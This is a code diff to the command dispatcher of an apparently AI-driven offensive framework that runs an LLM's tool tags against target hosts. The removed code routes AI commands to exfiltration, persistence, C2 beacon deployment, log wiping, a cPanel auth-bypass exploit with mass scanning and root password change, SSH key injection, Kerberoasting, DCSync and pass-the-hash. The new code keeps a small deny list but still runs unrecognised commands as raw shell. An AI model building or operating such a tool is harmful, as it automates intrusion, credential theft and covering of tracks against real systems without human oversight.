@@ -10,6 +10,7 @@ import os
 import re
 import concurrent.futures
 import time as _time
+import logging
 
 # ─────────────────────────────────────────────
 # IMPORTS FROM SHARED BASE (breaks circular deps)
@@ -154,12 +155,13 @@ def run_python_repl(code: str) -> str:
     return output
 
 
+
 def run_tool_by_command(command_str: str) -> str:
     """
     Called by LLM tool dispatch when AI writes [TOOL: nmap -sV 1.2.3.4].
     Splits the string and runs it safely.
-    v3.2: Comprehensive hallucination handling — catches fake tools, wrong syntax,
-    strips garbage flags, extracts IPs from port-appended strings.
+    v3.2: Comprehensive hallucination handling — catches fake tools, wrong syntax.
+    v12.0: Dynamic dispatch using the tool registry and structured argument parsing.
     """
     parts = command_str.strip().split()
     if not parts:
@@ -169,45 +171,10 @@ def run_tool_by_command(command_str: str) -> str:
 
     # ── HELPER: Extract clean IP from 'IP:PORT' or 'http://IP:PORT/path' ──
     def _extract_ip(s):
-        """Extract clean IP from various formats."""
         s = s.replace("http://", "").replace("https://", "")
         s = s.split("/")[0]  # remove path
         s = s.split(":")[0]  # remove port
         return s
-
-    # ── HELPER: Resolve creds — smart priority resolution ──
-    def _resolve_creds(host: str, user: str = None, pwd: str = None) -> tuple:
-        """Resolve credentials for a host.
-        v8.1: If AI provided creds that match ANY registered cred, use them.
-        Priority: AI-provided (if valid) > root > first cached.
-        This fixes the bug where root:octopus was overridden by support."""
-        cached_user, cached_pwd = get_best_creds_for_target(host)
-
-        # If AI provided creds, check if they are valid (registered)
-        if user and pwd:
-            all_creds = get_all_known_creds_for_target(host)
-            for svc, cred_list in all_creds.items():
-                for c_user, c_pwd in cred_list:
-                    if user == c_user and pwd == c_pwd:
-                        # AI sent valid registered creds — USE THEM
-                        return (user, pwd)
-            # AI creds not in cache — register and use if root
-            if user == "root":
-                register_credential("ssh", host, user, pwd)
-                return (user, pwd)
-            # AI creds not registered and not root — use best cached
-            if cached_user and cached_pwd:
-                print(f"  {C_YELLOW}[FIX] AI sent unregistered creds {user}:{pwd[:4]}*** for {host}")
-                print(f"       -> Using best cached: {cached_user}:{cached_pwd[:4]}***{C_RESET}")
-                return (cached_user, cached_pwd)
-            # Nothing cached — register AI creds
-            register_credential("ssh", host, user, pwd)
-            return (user, pwd)
-
-        # No AI creds — use best cached
-        if cached_user and cached_pwd:
-            return (cached_user, cached_pwd)
-        return (None, None)
 
     # ── BLOCK: Hallucinated/fake tools → return helpful error ──
     _FAKE_TOOLS = {
@@ -225,605 +192,127 @@ def run_tool_by_command(command_str: str) -> str:
         "metasploit_web_enum": "Use [TOOL: scrapling http://IP]",
         "msf_web_enum": "Use [TOOL: scrapling http://IP]",
         "smb_enum": "Use [CMD: enum4linux -a IP]",
-        # v7.0: Block tools that should use proper tags
         "msfconsole": "Use [MSF: module/path | RHOSTS=IP] instead of calling msfconsole directly",
-        "searchsploit": "Use [SEARCHSPLOIT: service version] tag instead of [TOOL: searchsploit ...]",
     }
     if cmd_lower in _FAKE_TOOLS:
         hint = _FAKE_TOOLS[cmd_lower]
         target_hint = _extract_ip(parts[1]) if len(parts) > 1 else "TARGET"
         return f"[!] '{parts[0]}' is NOT a real tool. AI: Use correct syntax: {hint.replace('IP', target_hint)}"
 
-    # ── SHODAN (v8.1) ────────────────────────────────────
-    if cmd_lower in ["shodan", "shodan_search", "shodan_host", "shodan_vulns", "shodan_range"]:
-        try:
-            from shodan_module import (run_shodan_search, run_shodan_host,
-                                       run_shodan_vulns, run_shodan_range, run_shodan_smart)
-            if len(parts) >= 3 and parts[1].lower() == "host":
-                return run_shodan_host(parts[2])
-            elif len(parts) >= 3 and parts[1].lower() == "vulns":
-                return run_shodan_vulns(parts[2])
-            elif len(parts) >= 3 and parts[1].lower() == "range":
-                return run_shodan_range(" ".join(parts[2:]))
-            elif len(parts) >= 2 and parts[1].lower() == "search":
-                return run_shodan_search(" ".join(parts[2:]))
-            elif len(parts) >= 2:
-                # v8.1: Smart routing — auto-detect IP / CIDR / query
-                return run_shodan_smart(" ".join(parts[1:]))
-            else:
-                return "[!] Usage: shodan search QUERY | shodan host IP | shodan vulns IP | shodan range CIDR"
-        except ImportError:
-            return "[!] shodan_module.py not found. Install: pip install shodan"
+    from core.tools.registry import get_tool, list_tools
+    import inspect
 
-    # ── HASH CRACKER (v8.0) ──────────────────────────────
-    if cmd_lower in ["crack_hashes", "hash_crack", "crack", "hashcrack"]:
-        try:
-            from hash_cracker import run_crack_hashes, run_crack_single
-            if len(parts) >= 2:
-                target = " ".join(parts[1:])
-                return run_crack_hashes(target)
-            else:
-                return "[!] Usage: crack_hashes /path/to/shadow OR crack_hashes '$6$salt$hash'"
-        except ImportError:
-            return "[!] hash_cracker.py not found."
+    alias_token_count = 1
+    tool_def = get_tool(cmd_lower)
+    if not tool_def and len(parts) >= 2:
+        two_word_name = f"{parts[0].lower()} {parts[1].lower()}"
+        tool_def = get_tool(two_word_name)
+        if tool_def:
+            cmd_lower = two_word_name
+            alias_token_count = 2
+    
+    if not tool_def:
+        # Fallback to pure shell command if not registered and not destructive
+        blocked = ["rm", "dd", "mkfs", "shutdown", "reboot", "wget", "chmod"]
+        if parts[0] in blocked:
+            return f"[!] Blocked command: {parts[0]}"
+        
+        # If the command looks like a shell command but might be a typo'd tool
+        available_tools = ", ".join([t.name for t in list_tools()])
+        print(f"  [93m[!] Tool '{cmd_lower}' not found in registry. Running as raw command.[0m")
+        # return f"[!] Tool '{cmd_lower}' not found. Available tools: {available_tools}"
+        from core.tools.base import run_tool
+        return run_tool(parts)
 
-    # ── KILL CHAIN TOOLS (v4.0) ──────────────────────────
-    if cmd_lower == "python_repl":
-        code = command_str[len("python_repl"):].strip()
-        # strip quotes if AI wrapped it
-        if code.startswith("'''") and code.endswith("'''"):
-            code = code[3:-3]
-        elif code.startswith('"""') and code.endswith('"""'):
-            code = code[3:-3]
-        return run_python_repl(code)
-    if cmd_lower in ["killchain_vuln_assess", "killchain_vuln", "vuln_assess"] and len(parts) >= 2:
-        target_ip = _extract_ip(parts[1])
-        recon_data = " ".join(parts[2:]) if len(parts) > 2 else ""
-        try:
-            from killchain import vuln_assess
-            return vuln_assess(target_ip, recon_data)
-        except ImportError:
-            return "[!] killchain.py not found."
-
-    if cmd_lower in ["killchain_exploit", "auto_exploit"] and len(parts) >= 2:
-        target_ip = _extract_ip(parts[1])
-        recon_data = " ".join(parts[2:]) if len(parts) > 2 else ""
-        try:
-            from killchain import auto_exploit
-            return auto_exploit(target_ip, recon_data)
-        except ImportError:
-            return "[!] killchain.py not found."
-
-    if cmd_lower in ["killchain_privesc", "privesc"] and len(parts) >= 2:
-        host = _extract_ip(parts[1])
-        user = parts[2] if len(parts) >= 3 else None
-        pwd = parts[3] if len(parts) >= 4 else None
-        # Auto-lookup creds if AI didn't provide them or sent wrong ones
-        user, pwd = _resolve_creds(host, user, pwd)
-        if not user or not pwd:
-            return f"[!] No SSH credentials known for {host}. Provide creds: killchain_privesc IP USER PASSWORD"
-        try:
-            from killchain import run_privesc
-            return run_privesc(host, user, pwd)
-        except ImportError:
-            return "[!] killchain.py not found."
-
-    if cmd_lower in ["killchain_persist", "persist", "persistence"] and len(parts) >= 2:
-        host = _extract_ip(parts[1])
-        user = parts[2] if len(parts) >= 3 else None
-        pwd = parts[3] if len(parts) >= 4 else None
-        user, pwd = _resolve_creds(host, user, pwd)
-        if not user or not pwd:
-            return f"[!] No SSH credentials known for {host}. Provide creds: killchain_persist IP USER PASSWORD"
-        try:
-            from killchain import plant_persistence
-            return plant_persistence(host, user, pwd)
-        except ImportError:
-            return "[!] killchain.py not found."
-
-    if cmd_lower in ["killchain_lateral", "lateral_move", "lateral"] and len(parts) >= 2:
-        host = _extract_ip(parts[1])
-        user = parts[2] if len(parts) >= 3 else None
-        pwd = parts[3] if len(parts) >= 4 else None
-        user, pwd = _resolve_creds(host, user, pwd)
-        if not user or not pwd:
-            return f"[!] No SSH credentials known for {host}. Provide creds: killchain_lateral IP USER PASSWORD"
-        try:
-            from killchain import lateral_move
-            return lateral_move(host, user, pwd)
-        except ImportError:
-            return "[!] killchain.py not found."
-
-    if cmd_lower in ["killchain_exfil", "data_exfil", "exfil"] and len(parts) >= 2:
-        host = _extract_ip(parts[1])
-        user = parts[2] if len(parts) >= 3 else None
-        pwd = parts[3] if len(parts) >= 4 else None
-        user, pwd = _resolve_creds(host, user, pwd)
-        if not user or not pwd:
-            return f"[!] No SSH credentials known for {host}. Provide creds: killchain_exfil IP USER PASSWORD"
-        try:
-            from killchain import data_exfil
-            return data_exfil(host, user, pwd)
-        except ImportError:
-            return "[!] killchain.py not found."
-
-    if cmd_lower in ["killchain_full", "full_killchain"] and len(parts) >= 2:
-        target_ip = _extract_ip(parts[1])
-        user = parts[2] if len(parts) >= 3 else None
-        pwd = parts[3] if len(parts) >= 4 else None
-        user, pwd = _resolve_creds(target_ip, user, pwd)
-        try:
-            from killchain import run_full_killchain
-            return run_full_killchain(target_ip, user, pwd)
-        except ImportError:
-            return "[!] killchain.py not found."
-
-    # v7.0: Stealth cleanup
-    if cmd_lower in ["killchain_cleanup", "cleanup", "stealth_cleanup"] and len(parts) >= 2:
-        host = _extract_ip(parts[1])
-        user = parts[2] if len(parts) >= 3 else None
-        pwd = parts[3] if len(parts) >= 4 else None
-        user, pwd = _resolve_creds(host, user, pwd)
-        if not user or not pwd:
-            return f"[!] No SSH credentials known for {host}. Provide creds: killchain_cleanup IP USER PASSWORD"
-        try:
-            from killchain import stealth_cleanup
-            return stealth_cleanup(host, user, pwd)
-        except ImportError:
-            return "[!] killchain.py not found."
-
-    # v8.0: Deploy C2 Beacon
-    if cmd_lower in ["deploy_c2_beacon", "c2_beacon"] and len(parts) >= 2:
-        host = _extract_ip(parts[1])
-        user = parts[2] if len(parts) >= 3 else None
-        pwd = parts[3] if len(parts) >= 4 else None
-        user, pwd = _resolve_creds(host, user, pwd)
-        if not user or not pwd:
-            return f"[!] No SSH credentials known for {host}. Provide creds: deploy_c2_beacon IP USER PASSWORD"
-        try:
-            from killchain import deploy_c2_beacon
-            return deploy_c2_beacon(host, user, pwd)
-        except ImportError:
-            return "[!] killchain.py not found."
-
-
-    # ── CVE-2026-41940 cPanel Auth Bypass (v11) ──────────
-    # cpanel_exploit IP [action] [args...]
-    # cpanel_check IP            — scan only
-    # cpanel_cmd IP COMMAND      — exec command
-    # cpanel_list IP             — list accounts
-    # cpanel_mass FILE [THREADS] — mass scan
-    if cmd_lower in ["cpanel_exploit", "cpanel_auth_bypass", "cve_2026_41940",
-                     "cpanel_rce", "cpanel_check", "cpanel_cmd", "cpanel_list",
-                     "cpanel_sshkey", "cpanel_wipe", "cpanel_info",
-                     "cpanel_mass", "cpanel_apitoken", "cpanel_passwd",
-                     "cpanel_sniper"] and len(parts) >= 2:
-        try:
-            from modules.exploits.cpanel_auth_bypass import CpanelSniper
-            sniper = CpanelSniper()
-            target = parts[1]
-
-            # Mass scan mode
-            if cmd_lower == "cpanel_mass":
-                threads = int(parts[2]) if len(parts) >= 3 else 20
-                out_file = parts[3] if len(parts) >= 4 else None
-                result = sniper.mass_scan(target, threads=threads, output=out_file)
-            # Scan only
-            elif cmd_lower == "cpanel_check":
-                result = sniper.scan(target)
-            # Exec command
-            elif cmd_lower == "cpanel_cmd":
-                command = " ".join(parts[2:]) if len(parts) >= 3 else "id"
-                result = sniper.exec_cmd(target, cmd=command)
-            # List accounts
-            elif cmd_lower == "cpanel_list":
-                result = sniper.list_accounts(target)
-            # SSH key inject
-            elif cmd_lower == "cpanel_sshkey":
-                key = " ".join(parts[2:]) if len(parts) >= 3 else ""
-                result = sniper.inject_sshkey(target, key)
-            # Wipe logs
-            elif cmd_lower == "cpanel_wipe":
-                result = sniper.wipe_logs(target)
-            # Server info
-            elif cmd_lower == "cpanel_info":
-                result = sniper.server_info(target)
-            # API token
-            elif cmd_lower == "cpanel_apitoken":
-                name = parts[2] if len(parts) >= 3 else "octopus"
-                result = sniper.create_apitoken(target, name=name)
-            # Change password
-            elif cmd_lower == "cpanel_passwd":
-                if len(parts) < 3:
-                    return "[!] Usage: cpanel_passwd <target> <new_password>"
-                pw = parts[2]
-                result = sniper.change_root_passwd(target, pw)
-            # Generic: cpanel_exploit IP [action] [args]
-            else:
-                action = parts[2] if len(parts) >= 3 else "cmd"
-                cmd_arg = " ".join(parts[3:]) if len(parts) >= 4 else "id"
-                result = sniper.exploit(target, action=action, cmd=cmd_arg)
-
-            import json as _json
-            out = f"[CVE-2026-41940 — {target}]\n"
-            # Show raw output if present
-            raw = result.pop("raw_output", "")
-            out += _json.dumps(result, indent=2, default=str)
-            if raw:
-                out += f"\n\n─── RAW OUTPUT ───\n{raw}"
-            return out
-        except FileNotFoundError as e:
-            return f"[!] cpanel_sniper binary not found: {e}"
-        except ImportError as ie:
-            return f"[!] cpanel_auth_bypass module: {ie}"
-        except Exception as e:
-            return f"[!] cPanel exploit error: {e}"
-
-    # ── ShardBrowser / ShardX OSINT (v11) ──────────────────
-    # shardbrowser QUERY     — OSINT search
-    # shard_launch [PROXY]   — launch isolated profile
-    # shard_multi COUNT      — launch multiple sessions
-    if cmd_lower in ["shardbrowser", "shard_osint", "osint_browser",
-                     "shard_launch", "shard_multi", "shard_recon"] and len(parts) >= 2:
-        try:
-            from core.osint.shardbrowser import ShardBrowser
-            sb = ShardBrowser()
-
-            if cmd_lower == "shard_launch":
-                proxy = parts[1] if parts[1].startswith("socks") or parts[1].startswith("http") else None
-                session = sb.launch_profile(proxy=proxy)
-                return f"[ShardX] Profile launched — CDP: {session.cdp_url}"
-
-            elif cmd_lower == "shard_multi":
-                count = int(parts[1])
-                proxies = parts[2:] if len(parts) > 2 else None
-                sessions = sb.multi_session(count, proxy_list=proxies)
-                return f"[ShardX] {len(sessions)} sessions launched"
-
-            elif cmd_lower == "shard_recon":
-                name = " ".join(parts[1:])
-                results = sb.social_recon(name)
-                import json as _json
-                return f"[ShardX Social Recon — {name}]\n" + _json.dumps(results, indent=2, default=str)
-
-            else:  # osint
-                query = " ".join(parts[1:])
-                results = sb.osint_target(query)
-                import json as _json
-                return f"[ShardX OSINT — {query}]\n" + _json.dumps(results, indent=2, default=str)
-
-        except Exception as e:
-            return f"[!] ShardBrowser error: {e}"
-
-    # ── AD TOOLS (v9.0) ─────────────────────────────────
-    if cmd_lower in ["ad_enum", "ad_enumerate", "enumerate_ad"] and len(parts) >= 2:
-        return _run_ad_tool("enum", _extract_ip(parts[1]))
-
-    if cmd_lower in ["asrep_roast", "asreproast", "as_rep_roast"] and len(parts) >= 2:
-        return _run_ad_tool("asrep", _extract_ip(parts[1]))
-
-    if cmd_lower in ["kerberoast", "kerberoasting"] and len(parts) >= 2:
-        return _run_ad_tool("kerberoast", _extract_ip(parts[1]))
-
-    if cmd_lower in ["dcsync", "dc_sync", "secretsdump"] and len(parts) >= 2:
-        return _run_ad_tool("dcsync", _extract_ip(parts[1]))
-
-    if cmd_lower in ["pass_the_hash", "pth"] and len(parts) >= 2:
-        return _run_ad_tool("pth", _extract_ip(parts[1]))
-
-    if cmd_lower in ["psexec", "ps_exec"] and len(parts) >= 2:
-        return _run_ad_tool("psexec", _extract_ip(parts[1]))
-
-    if cmd_lower in ["wmiexec", "wmi_exec"] and len(parts) >= 2:
-        return _run_ad_tool("wmiexec", _extract_ip(parts[1]))
-
-    # ── PIVOT TOOLS (v9.0) ──────────────────────────────
-    if cmd_lower in ["socks_proxy", "socks", "proxy"] and len(parts) >= 2:
-        return _run_pivot_tool("socks", _extract_ip(parts[1]))
-
-    if cmd_lower in ["port_forward", "forward", "portforward"] and len(parts) >= 2:
-        return _run_pivot_tool("forward", _extract_ip(parts[1]))
-
-    if cmd_lower in ["network_recon", "net_recon", "netinfo"] and len(parts) >= 2:
-        return _run_pivot_tool("netinfo", _extract_ip(parts[1]))
-
-    # ── C2 BUILD TOOLS (v9.0) ───────────────────────────
-    if cmd_lower in ["build_go_implant", "go_implant", "garble_build"]:
-        target_ip = _extract_ip(parts[1]) if len(parts) >= 2 else "0.0.0.0"
-        return _run_c2_build("go", target_ip)
-
-    if cmd_lower in ["build_python_implant", "python_implant", "py_implant"]:
-        target_ip = _extract_ip(parts[1]) if len(parts) >= 2 else "0.0.0.0"
-        return _run_c2_build("python", target_ip)
-
-    if cmd_lower in ["build_ps_stager", "ps_stager", "powershell_stager"]:
-        target_ip = _extract_ip(parts[1]) if len(parts) >= 2 else "0.0.0.0"
-        return _run_c2_build("powershell", target_ip)
-
-    # ── EVASION TOOLS (v4.1) ─────────────────────────────
-    if cmd_lower in ["waf_detect", "detect_waf", "waf"] and len(parts) >= 2:
-        target_ip = _extract_ip(parts[1])
-        try:
-            from evasion import WebEvasionSession
-            ws = WebEvasionSession()
-            result = ws.detect_waf(f"http://{target_ip}")
-            out = f"[WAF DETECTION — {target_ip}]\n"
-            out += f"WAF Detected: {result['waf_detected']}\n"
-            out += f"WAF Type: {result['waf_type']}\n"
-            for d in result.get('details', []):
-                out += f"  → {d}\n"
-            return out
-        except ImportError:
-            return "[!] evasion.py not found."
-
-    if cmd_lower in ["stealth_brute", "stealth_bruteforce", "evasion_brute"] and len(parts) >= 3:
-        svc = parts[1].lower()
-        target_ip = _extract_ip(parts[2])
-        try:
-            from evasion import ssh_bruteforce_stealth, web_bruteforce_stealth
-            if svc in ("ssh", "sftp"):
-                return ssh_bruteforce_stealth(target_ip, users=["root", "admin", "support", "user", "test"])
-            elif svc in ("web", "http", "http-post-form"):
-                return web_bruteforce_stealth(f"http://{target_ip}")
-            else:
-                return f"[!] Stealth brute not available for '{svc}'. Use [TOOL: bruteforce {svc} {target_ip}]"
-        except ImportError:
-            return "[!] evasion.py not found."
-
-    # ── SSH session (post-exploitation via paramiko) ──
-    if cmd_lower in ["ssh_session", "ssh-session", "sshsession"] and len(parts) >= 2:
-        host = _extract_ip(parts[1])
-        user = parts[2] if len(parts) >= 3 else None
-        pwd = parts[3] if len(parts) >= 4 else None
-        # Auto-resolve creds — AI often sends wrong password from another target
-        user, pwd = _resolve_creds(host, user, pwd)
-        if not user or not pwd:
-            return f"[!] No SSH credentials known for {host}. Provide creds: ssh_session IP USER PASSWORD"
-        try:
-            from ssh_session import ssh_analyze
-            return ssh_analyze(host, user, pwd)
-        except ImportError:
-            return "[!] ssh_session.py not found. Cannot perform SSH post-exploitation."
-
-    # ── SSH exec (run a single command on target) ──
-    if cmd_lower in ["ssh_exec", "ssh-exec"] and len(parts) >= 3:
-        host = _extract_ip(parts[1])
-        # Try to detect if AI sent creds or just a command
-        # Pattern 1: ssh_exec HOST USER PASS command (standard)
-        # Pattern 2: ssh_exec HOST command (auto-resolve creds)
-        if len(parts) >= 5:
-            user = parts[2]
-            pwd = parts[3]
-            cmd = " ".join(parts[4:])
-        else:
-            # No creds provided — try auto-resolve
-            user, pwd = get_best_creds_for_target(host)
-            cmd = " ".join(parts[2:])
-        # Auto-resolve creds if AI sent wrong ones
-        user, pwd = _resolve_creds(host, user, pwd)
-        if not user or not pwd:
-            return f"[!] No SSH credentials known for {host}. Syntax: ssh_exec HOST USER PASS command"
-        # v6.0: Strip surrounding quotes that the AI or tag parser leaves on commands
-        cmd = cmd.strip("'\"")
-        if not cmd:
-            return "[!] ssh_exec needs a command to run. Syntax: ssh_exec HOST USER PASS command"
-        try:
-            from ssh_session import ssh_exec
-            return ssh_exec(host, user, pwd, cmd)
-        except ImportError:
-            return "[!] ssh_session.py not found."
-
-    # ── SSH user enumeration ──
-    if cmd_lower in ["ssh_user_enum", "ssh-user-enum", "sshenum"] and len(parts) >= 2:
-        target_ip = _extract_ip(parts[1])
-        port = 22
-        if len(parts) >= 3 and parts[2].isdigit():
-            port = int(parts[2])
-        return run_ssh_user_enum(target_ip, port)
-
-    # ── Bruteforce (ALL patterns — strip garbage flags) ──
-    if cmd_lower in ["bruteforce", "bruteforce_ssh", "bruteforce_web"]:
-        if len(parts) < 2:
-            return "[!] bruteforce needs at least a target. Syntax: bruteforce SERVICE IP"
-
-        if cmd_lower == "bruteforce_ssh":
-            return run_bruteforce("ssh", _extract_ip(parts[1]))
-        elif cmd_lower == "bruteforce_web":
-            return run_web_login_bruteforce(_extract_ip(parts[1]))
-
-        # v6.0: Smart argument detection — AI sends EITHER:
-        #   bruteforce SERVICE IP       (correct: bruteforce ssh 83.166.241.164)
-        #   bruteforce IP PORT SERVICE  (wrong:   bruteforce 83.166.241.164 22 ssh)
-        #   bruteforce IP SERVICE       (wrong:   bruteforce 83.166.241.164 ssh)
-        # Detect by checking if parts[1] looks like an IP address
-        import re as _re
-        _IP_PATTERN = _re.compile(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$')
-
-        if _IP_PATTERN.match(parts[1]):
-            # AI sent IP first — swap to get correct order
-            target = _extract_ip(parts[1])
-            # Try to find service name in remaining parts
-            service = "ssh"  # default
-            for p in parts[2:]:
-                p_lower = p.lower().split(':')[0].split('=')[0]  # strip port/flag suffixes
-                if p_lower in ("ssh", "sftp", "ftp", "http", "https", "smtp",
-                                "http-post-form", "https-post-form", "http-get",
-                                "http-head", "web", "telnet", "rdp", "vnc",
-                                "mysql", "postgres", "mssql", "redis", "ldap"):
-                    service = p_lower
-                    break
-            print(f"  {C_YELLOW}[FIX] Bruteforce args reordered: service={service} target={target}{C_RESET}")
-        else:
-            # AI sent SERVICE first (correct format)
-            service = parts[1].lower()
-            target = _extract_ip(parts[2]) if len(parts) >= 3 else _extract_ip(parts[1])
-
-        # Route web services to web login bruteforce
-        if service in ["http-post-form", "https-post-form", "http-get", "http",
-                        "https", "web", "http-head"]:
-            return run_web_login_bruteforce(target)
-
-        # For standard services, strip all garbage flags
-        return run_bruteforce(service, target)
-
-    # ── Web login bruteforce ──
-    if cmd_lower in ["web_login_brute", "web-login-brute", "web_brute", "webbrute"]:
-        if len(parts) >= 2:
-            return run_web_login_bruteforce(_extract_ip(parts[1]))
-        return "[!] web_login_brute needs a target IP."
-
-    # ── Metasploit web enum → scrapling fallback ──
-    if cmd_lower in ["metasploit_web_enum", "msf_web_enum"] and len(parts) >= 2:
-        url = parts[1]
-        print(f"  {C_YELLOW}[FIX] {parts[0]} is not a real tool → running scrapling{C_RESET}")
-        return run_scrapling_fetch(url)
-
-    # ── dirb_fuzz / dirb / dirbuster → ffuf ──
-    if cmd_lower in ["dirb_fuzz", "dirb", "dirbuster"] and len(parts) >= 2:
-        print(f"  [*] Auto-Fuzzing directories for {parts[1]}")
-        clean_target = _extract_ip(parts[1])
-        return run_ffuf(clean_target)
-
-    # ── scrapling ──
-    if cmd_lower == "scrapling" and len(parts) >= 2:
-        return run_scrapling_fetch(parts[1])
-
-    # ── nmap (with flag passthrough + strip -oX output flags) ──
-    if cmd_lower in ["nmap", "nmap_scan"] and len(parts) >= 2:
-        # Strip output flags the AI adds (-oX, -oN, -oG, -oA)
-        clean_parts = []
-        skip_next = False
-        for i, p in enumerate(parts[1:], 1):
-            if skip_next:
-                skip_next = False
-                continue
-            if p in ["-oX", "-oN", "-oG", "-oA", "-o"]:
-                skip_next = True  # skip the flag AND its argument
-                continue
-            # Also strip --ports (not a real nmap flag)
-            if p.startswith("--ports"):
-                continue
-            if p.startswith("--output"):
-                skip_next = True
-                continue
-            clean_parts.append(p)
-
-        if not clean_parts:
-            return "[!] nmap needs a target IP."
-
-        target_ip = clean_parts[-1]
-        extra_flags = clean_parts[:-1]
-        return run_nmap(target_ip, extra_flags=extra_flags if extra_flags else None)
-
-    # ── searchsploit (strip -s, -p, --exclude flags) ──
-    if cmd_lower == "searchsploit" and len(parts) >= 2:
-        # AI writes: searchsploit -s "nginx 1.14.0" or searchsploit -p 39446
-        # Correct: searchsploit nginx 1.14.0
-        clean_terms = []
-        skip_next = False
-        for p in parts[1:]:
-            if skip_next:
-                skip_next = False
-                continue
-            if p in ["-s", "--service", "--output"]:
-                continue  # strip fake flags
-            if p in ["-p", "--path"]:
-                # searchsploit -p EDB-ID → we handle this
-                continue
-            if p.startswith("--exclude"):
-                skip_next = True
-                continue
-            # Strip port suffixes like "-p 80,443"
-            if p.startswith("-p") and len(p) <= 3:
-                skip_next = True
-                continue
-            clean_terms.append(p.strip('"').strip("'"))
-
-        search_query = " ".join(clean_terms)
-        if not search_query:
-            return "[!] searchsploit needs a search term."
-        print(f"  [*] searchsploit: {search_query}")
-        return run_tool(["searchsploit", "--color"] + search_query.split(), timeout=60)
-
-    # ── sqlmap (fix URL format) ──
-    if cmd_lower == "sqlmap" and len(parts) >= 2:
-        # Strip garbage flags: --output-dir, --output
-        clean_parts = ["sqlmap"]
-        skip_next = False
-        for p in parts[1:]:
-            if skip_next:
-                skip_next = False
-                continue
-            if p.startswith("--output"):
-                skip_next = True
-                continue
-            clean_parts.append(p)
-        # Ensure --batch is present
-        if "--batch" not in clean_parts:
-            clean_parts.append("--batch")
-        return run_tool(clean_parts, timeout=180)
-
-    # ── nikto (fix syntax) ──
-    if cmd_lower in ["nikto", "nikto_scan"] and len(parts) >= 2:
-        # Strip -Format and -o flags AI adds
-        clean_parts = ["nikto"]
-        skip_next = False
-        target_found = False
-        for p in parts[1:]:
-            if skip_next:
-                skip_next = False
-                continue
-            if p in ["-Format", "-o", "--output", "-output"]:
-                skip_next = True
-                continue
-            if p == "-h" or p.startswith("-h"):
+    def parse_args_for_tool(cmd_string: str, t_def):
+        p_parts = cmd_string.strip().split()
+        if not p_parts:
+            return [], {}
+        args = p_parts[alias_token_count:]
+        sig = inspect.signature(t_def.func)
+        params = list(sig.parameters.values())
+        kwargs = {}
+        positional_args = []
+        
+        # NMAP specific garbage stripping logic ported over
+        if t_def.name == "nmap" and args:
+            clean_parts = []
+            skip_next = False
+            for p in args:
+                if skip_next:
+                    skip_next = False
+                    continue
+                if p in ["-oX", "-oN", "-oG", "-oA", "-o"] or p.startswith("--output"):
+                    skip_next = True
+                    continue
+                if p.startswith("--ports"):
+                    continue
                 clean_parts.append(p)
-                target_found = True
+            args = clean_parts
+            if not args:
+                return [], {}
+            target_ip = args[-1]
+            extra_flags = args[:-1]
+            return [target_ip], {"extra_flags": extra_flags if extra_flags else None}
+            
+        # Searchsploit specific stripping logic
+        if t_def.name == "searchsploit" and args:
+            clean_terms = []
+            skip_next = False
+            for p in args:
+                if skip_next:
+                    skip_next = False
+                    continue
+                if p in ["-s", "--service", "--output", "-p", "--path"]:
+                    continue
+                if p.startswith("--exclude") or (p.startswith("-p") and len(p) <= 3):
+                    skip_next = True
+                    continue
+                clean_terms.append(p.strip('"').strip("'"))
+            return [" ".join(clean_terms)], {}
+
+        for i, p in enumerate(params):
+            if p.name in ['target', 'target_ip', 'host', 'url', 'filepath']:
+                if args:
+                    positional_args.append(_extract_ip(args.pop(0)))
+                elif p.default != inspect.Parameter.empty:
+                    kwargs[p.name] = p.default
+            elif p.name in ['query', 'recon_data', 'cmd', 'command', 'action']:
+                if args:
+                    positional_args.append(' '.join(args))
+                    args = []
+                elif p.default != inspect.Parameter.empty:
+                    kwargs[p.name] = p.default
+            elif p.name in ['extra_flags', 'opts']:
+                if args:
+                    positional_args.append(args)
+                    args = []
+                elif p.default != inspect.Parameter.empty:
+                    kwargs[p.name] = p.default
+            elif p.name in ['user', 'pwd', 'password']:
+                if args:
+                    positional_args.append(args.pop(0))
+                elif p.default != inspect.Parameter.empty:
+                    kwargs[p.name] = p.default
             else:
-                clean_parts.append(p)
-        if not target_found and len(parts) >= 2:
-            # AI wrote: nikto IP instead of nikto -h IP
-            ip = _extract_ip(parts[1])
-            clean_parts = ["nikto", "-h", ip] + [p for p in clean_parts[1:] if p != ip]
-        return run_tool(clean_parts, timeout=300)
+                if args:
+                    positional_args.append(args.pop(0))
+                elif p.default != inspect.Parameter.empty:
+                    kwargs[p.name] = p.default
+        if args:
+            positional_args.extend(args)
+        return positional_args, kwargs
 
-    # ── jmx2rce ──
-    if cmd_lower == "jmx2rce" and len(parts) >= 3:
-        subcmd = parts[1].lower()
-        host = parts[2] if not parts[2].startswith("-") else None
-        for i, p in enumerate(parts):
-            if p == "-H" and i + 1 < len(parts):
-                host = parts[i + 1]
-                break
-        if not host:
-            host = parts[-1]
+    # Explicit debugging
+    print(f"  [94m[*] Dispatching tool: {tool_def.name} (via {cmd_lower})[0m")
+    try:
+        p_args, p_kwargs = parse_args_for_tool(command_str, tool_def)
+        print(f"      -> Args: {p_args}, Kwargs: {p_kwargs}")
+        return tool_def.func(*p_args, **p_kwargs)
+    except Exception as e:
+        import traceback
+        return f"[!] Error executing tool '{tool_def.name}': {e}\\n{traceback.format_exc()}"
 
-        if subcmd == "scan":
-            return run_jmx2rce_scan(host)
-        elif subcmd == "rce":
-            payload = None
-            for i, p in enumerate(parts):
-                if p == "-payload" and i + 1 < len(parts):
-                    payload = parts[i + 1]
-            return run_jmx2rce_rce(host, payload)
-        elif subcmd == "read":
-            filepath = "/etc/passwd"
-            for i, p in enumerate(parts):
-                if p == "-p" and i + 1 < len(parts):
-                    filepath = parts[i + 1]
-            return run_jmx2rce_read(host, filepath)
-        elif subcmd == "cleanup":
-            return run_jmx2rce_cleanup(host)
-        else:
-            return run_jmx2rce_scan(host)
-
-    # ── Safety check — block destructive commands ──
-    blocked = ["rm", "dd", "mkfs", "shutdown", "reboot", "wget", "chmod"]
-    if parts[0] in blocked:
-        return f"[!] Blocked command: {parts[0]}"
-
-    # ── Fallback: try running as raw command ──
-    return run_tool(parts)
 
 
 # ─────────────────────────────────────────────
@@ -937,11 +426,11 @@ def interactive_tool_run(target: str) -> str:
         # ── PHASE 3 (v4.0): Vulnerability Assessment ──
         print(f"\n  [*] Phase 3: Kill chain vulnerability assessment...")
         try:
-            from killchain import vuln_assess
+            from core.killchain import vuln_assess
             recon_blob = format_recon_for_llm(results)
